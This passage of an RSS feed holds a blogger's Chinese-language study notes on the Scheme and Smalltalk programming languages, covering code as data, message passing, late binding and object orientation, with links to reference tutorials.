&lt;li&gt;lisp中所有东西都是数据  代码也是 虚虚实实 惰性求值变得容易 。&lt;/li&gt;
&lt;li&gt;字符是个比较关键的概念，代码本身只是文本而已。Lisp语言的最初目的就是符号处理，在Scheme语言中几乎所有的东西都可以看做是符号或做为符号列表来处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://deathking.github.io/yast-cn/"&gt;Scheme入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/heros/archive/2009/11/30/1614111.html"&gt;Scheme简明教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/search/csass/search/?q=Scheme&amp;amp;sn=dw&amp;amp;lang=zh&amp;amp;cc=CN&amp;amp;en=utf&amp;amp;hpp=20&amp;amp;dws=cndw&amp;amp;lo=zh"&gt;ibm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learn-Scheme.html</guid></item><item><title>Smalltalk学习笔记</title><link>/learn-Smalltalk.html</link><description>&lt;ul&gt;
&lt;li&gt;所有一切都是物体（Everything is an Object）。这是Smalltalk中最重要的一条规则。&lt;/li&gt;
&lt;li&gt;一个变量没有与之关联的类型。变量仅仅指向物体&lt;/li&gt;
&lt;li&gt;a := 2的真正含义不是“将a的值设置为整数2”，而是“让变量a指向一个值为2的SmallInteger(小整数)物体”&lt;/li&gt;
&lt;li&gt;所有的计算都通过消息（message）来触发。你向某个物体发送消息，然后就会发生某些事情。&lt;/li&gt;
&lt;li&gt;(15 * 19) + (37 squared)可以理解为：向15发送消息 * ，参数为19；向37发送消息squared；最后向15*19的结果发送消息 + ，参数为37 squared的结果。&lt;/li&gt;
&lt;li&gt;Smalltalk中所有的表达式都是&amp;lt;接受消息的物体&amp;gt; &amp;lt;消息&amp;gt;&lt;/li&gt;
&lt;li&gt;消息激发方法。一个消息会对应什么方法是由接受消息的物体决定的。&lt;/li&gt;
&lt;li&gt;每条消息（to: do:, whileTrue:, +）都会激发方法，这些方法是Smalltalk中的代码单元，你可以认为方法就是你常用的编程语言中的函数或者过程。方法是计算发生的地方。。你不仅可以查看它们的控制结构和操作是如何实现的——而且还能改动它们！&lt;/li&gt;
&lt;li&gt;每一个物体都是某类事物的一个实例。&lt;/li&gt;
&lt;li&gt;由于该类（事物）中定义了此实例（物体）的行为，所以必须找到这个接受消息的物体所属于的类，然后通过类来指出应该如何解释收到的消息。这一点非常重要。  (代码的位置，高层和底层视角的切换 很微妙)&lt;/li&gt;
&lt;li&gt;类是定义方法（行为）的地方，决定了物体是否有某种能力（能执行某个动作），所有代码都能在类中找到,没有魔术&lt;/li&gt;
&lt;li&gt;Smalltalk中没有什么要记住的关键字（甚至没有if，你可以自己实现）！使用Smalltalk，就像用小积木，能让你搭建出你想要的任何东西。&lt;/li&gt;
&lt;li&gt;在Smalltalk语言中没有条件语句，取而代之的是一些发送给对象true或者false的消息，因此它们不属于语言部分，而属于Smalltalk的类库；也没有循环重复语句（C语言中的for, while），Smalltalk用向数字对象或块对象发送消息来实现重复执行。&lt;/li&gt;
&lt;li&gt;语言没有固定的语法，语法分析由类本身完成&lt;/li&gt;
&lt;li&gt;Smalltalk是一种使用“晚绑定（late-binding”的语言，让相同的消息在不同的数据上执行近似的功能成为多态。当你看到一个printString消息时，你实际上并不知道将会执行什么，直到你了解这个消息被发送给哪个物体后，才能清楚到底会执行什么内容&lt;/li&gt;
&lt;li&gt;从smalltalk这里学习对象，从lisp那里学习函数&lt;/li&gt;
&lt;li&gt;面向对象编程的精髓在于将行为绑定在数据上&lt;/li&gt;
&lt;li&gt;在结构化程序设计之中，我们将精力集中在行为（动词）上，然后弄清楚我们需要哪些数据（名词）才能执行。总而言之，我们将数据绑定在行为上。但在面向对象程序设计之中，我们将程序的中心用名词和数据表示，然后弄清楚我们要将哪些行为绑定在他们之上&lt;/li&gt;
&lt;li&gt;Smalltalk和Scheme都非常优美纯粹，一致性非常好，相比之下，主流工业语言有些大杂烩，不少由于妥协导致的不一致，以及难以理解&lt;/li&gt;
&lt;li&gt;严格遵照一个唯一标准机制的做法已经被证明具有惊人的威力&lt;/li&gt;
&lt;li&gt;学习纯粹的语言，能让你更容易搞懂核心概念，而不会被各种枝节分神，而这些概念是大多编程语言的核心&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/Smalltalk"&gt;Smalltalk wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.51cto.com/art/201109/291681.htm"&gt;Smalltalk为什么让我爱不释手&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_7d553bb501013w7d.html"&gt;Smalltalk的基本规则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learn-Smalltalk.html</guid></item></channel></rss>